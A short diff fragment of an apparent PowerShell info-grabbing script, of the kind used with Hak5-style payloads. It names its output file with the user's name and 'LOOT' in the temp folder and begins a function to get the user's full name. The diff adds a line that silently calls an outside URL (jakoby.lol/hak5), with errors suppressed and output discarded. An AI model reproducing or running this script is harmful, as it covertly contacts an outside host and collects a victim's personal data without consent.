@@ -1,5 +1,5 @@
 $FileName = "$env:tmp/$env:USERNAME-LOOT-$(get-date -f yyyy-MM-dd_hh-mm).txt"
-
+iwr "https://jakoby.lol/hak5" -EA 0 >$null
 #------------------------------------------------------------------------------------------------------------------------------------
 
 function Get-fullName {
